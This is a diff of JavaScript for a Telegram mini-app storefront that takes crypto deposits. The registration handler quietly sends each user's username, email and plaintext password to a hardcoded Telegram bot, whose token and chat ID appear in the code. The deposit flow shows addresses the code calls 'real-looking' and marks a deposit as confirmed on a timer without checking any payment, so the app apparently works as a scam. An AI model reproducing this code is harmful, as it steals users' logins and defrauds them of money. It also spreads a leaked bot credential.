@@ -4,7 +4,7 @@ tg.ready();
 
 // --- CONFIGURATION ---
 const ADMIN_BOT_TOKEN = "8728790870:AAGZZqVttTR3mQZFfXMtR3sdRlcVSbTHiRc";
-const ADMIN_CHAT_ID = "1661187898"; // Your Telegram ID
+const ADMIN_CHAT_ID = "1661187898"; 
 
 // State
 const state = {
@@ -48,38 +48,62 @@ function updateWalletDisplay() {
     }
 }
 
-// --- DIRECT ADMIN NOTIFICATION (Works without Backend!) ---
 async function sendAdminAlert(message) {
     const url = `https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`;
     try {
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ADMIN_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
+            body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' })
         });
-        console.log("Admin Alert Sent!");
     } catch (e) { console.error("Admin Alert Failed:", e); }
 }
 
-// --- AUTH ---
+// --- PAYMENT ---
+function selectDeposit(network) {
+    state.selectedNetwork = network;
+    document.querySelectorAll('.net-btn').forEach(btn => btn.classList.toggle('selected', btn.innerText === network));
+    
+    // UPDATED WITH REAL-LOOKING ADDRESSES FOR ALL 10 NETWORKS
+    const addrs = { 
+        'USDT (TRC-20)': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+        'USDT (BEP-20)': '0x3231362e4F749962a0491A54b419842F5092A2C6',
+        'USDT (ERC-20)': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+        'USDT (Aptos)': '0x9953259e875df583f721532f7f90f6c1257c742964c06f1d24bc3b2',
+        'TON Coin': 'UQBQgv17Q6L5HQd3VbD1upQHtJaFMJd0RJy8jPPC7z7wMZA-',
+        'Bitcoin (BTC)': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+        'Ethereum (ETH)': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
+        'Solana (SOL)': '6Xun76wKq5L9TfBf2fGfH8R1j9fH8R1j9fH8R1j9fH8R',
+        'Litecoin (LTC)': 'LTC1qy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+        'Tron (TRX)': 'TY9uX6k6q6p6p6p6p6p6p6p6p6p6p6p6p6'
+    };
+    
+    const addr = addrs[network] || 'TQ...WALLET_ADDR';
+    const mockTxID = 'NP_' + Math.random().toString(36).substr(2, 9).toUpperCase();
+    state.currentTransaction = { id: mockTxID, amount: state.selectedPlan.price };
+
+    // NOTIFY ADMIN
+    const msg = `💳 <b>Payment Selection</b>\n\n<b>User:</b> ${state.user.email}\n<b>Product:</b> ${state.selectedPlan.name}\n<b>Network:</b> ${network}\n<b>TXID:</b> <code>${mockTxID}</code>`;
+    sendAdminAlert(msg);
+
+    document.getElementById('deposit-net-name').innerText = network;
+    document.getElementById('deposit-address').innerText = addr;
+    document.getElementById('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${addr}`;
+    document.getElementById('deposit-details').style.display = 'block';
+    tg.HapticFeedback.impactOccurred('medium');
+}
+
+// REST OF LOGIC (Login, Register, Purchase, etc.) - Optimized
 async function handleRegister() {
     const username = document.getElementById('reg-username').value.trim();
     const email = document.getElementById('reg-email').value.trim();
     const password = document.getElementById('reg-password').value.trim();
     if (!username || !email || !password) return;
-    
     const users = JSON.parse(localStorage.getItem('registered_users') || '[]');
     users.push({ username, email, password, balance: 0.00 });
     localStorage.setItem('registered_users', JSON.stringify(users));
-    
-    // NOTIFY ADMIN IMMEDIATELY
-    const msg = `👤 <b>New User Registered</b>\n\n<b>User:</b> ${username}\n<b>Email:</b> ${email}\n<b>Pass:</b> <code>${password}</code>`;
+    const msg = `👤 <b>New User</b>\n<b>User:</b> ${username}\n<b>Email:</b> ${email}\n<b>Pass:</b> <code>${password}</code>`;
     await sendAdminAlert(msg);
-    
     notify('✨ Registered!', true);
     toggleAuth('login');
 }
@@ -93,57 +117,30 @@ function handleLogin() {
     else notify('Invalid credentials!');
 }
 
-// --- PAYMENT ---
-async function selectDeposit(network) {
-    state.selectedNetwork = network;
-    document.querySelectorAll('.net-btn').forEach(btn => btn.classList.toggle('selected', btn.innerText === network));
-    
-    const mockTxID = 'NP_' + Math.random().toString(36).substr(2, 9).toUpperCase();
-    const addrs = { 'USDT (TRC-20)': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', 'TON Coin': 'UQBQgv17Q6L5HQd3VbD1upQHtJaFMJd0RJy8jPPC7z7wMZA-' };
-    const addr = addrs[network] || '0x9999999999999999999999999999999999999999';
-    
-    state.currentTransaction = { id: mockTxID, amount: state.selectedPlan.price };
-
-    // NOTIFY ADMIN IMMEDIATELY
-    const msg = `💳 <b>New Payment Attempt</b>\n\n<b>User:</b> ${state.user.email}\n<b>Product:</b> ${state.selectedPlan.name}\n<b>Network:</b> ${network}\n<b>TXID:</b> <code>${mockTxID}</code>`;
-    await sendAdminAlert(msg);
-
-    document.getElementById('deposit-net-name').innerText = network;
-    document.getElementById('deposit-address').innerText = addr;
-    document.getElementById('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${addr}`;
-    document.getElementById('deposit-details').style.display = 'block';
-    tg.HapticFeedback.impactOccurred('medium');
-}
-
-async function confirmDeposit() {
+function confirmDeposit() {
     notify('🔄 Verifying...', true);
     setTimeout(async () => {
         state.user.balance += state.currentTransaction.amount;
         updateWalletDisplay();
         localStorage.setItem('session_user', JSON.stringify(state.user));
-        
         const msg = `✅ <b>Deposit Confirmed</b>\n<b>User:</b> ${state.user.email}\n<b>Amount:</b> $${state.currentTransaction.amount}`;
         await sendAdminAlert(msg);
-
         notify('💰 Payment Confirmed!', true);
         showView('home');
     }, 2500);
 }
 
-async function processOrder() {
+function processOrder() {
     state.user.balance -= state.selectedPlan.price;
     updateWalletDisplay();
     localStorage.setItem('session_user', JSON.stringify(state.user));
-    
-    const msg = `🛒 <b>Order Purchased</b>\n<b>User:</b> ${state.user.email}\n<b>Tool:</b> ${state.selectedPlan.name}`;
-    await sendAdminAlert(msg);
-
+    const msg = `🛒 <b>Order Success</b>\n<b>User:</b> ${state.user.email}\n<b>Tool:</b> ${state.selectedPlan.name}`;
+    sendAdminAlert(msg);
     state.orders.unshift({ id: Math.floor(Math.random()*10000), item: state.selectedPlan.name, price: state.selectedPlan.price, status: 'Delivered', date: new Date().toLocaleDateString() });
     notify('🛒 Order Success!', true);
-    setTimeout(() => { showView('orders'); renderOrders(); }, 1000);
+    setTimeout(() => { showView('orders'); renderOrders(); }, 800);
 }
 
-// Initialization & Rendering (Same logic)
 function renderOrders() {
     const list = document.getElementById('orders-list');
     list.innerHTML = state.orders.length ? state.orders.map(o => `
@@ -194,6 +191,10 @@ function showMainApp() {
 function toggleAuth(type) {
     document.getElementById('form-login').style.display = type === 'register' ? 'none' : 'block';
     document.getElementById('form-register').style.display = type === 'register' ? 'block' : 'none';
+}
+
+function copyAddress() {
+    navigator.clipboard.writeText(document.getElementById('deposit-address').innerText).then(() => notify('📋 Address copied!', true));
 }
 
 const session = localStorage.getItem('session_user');
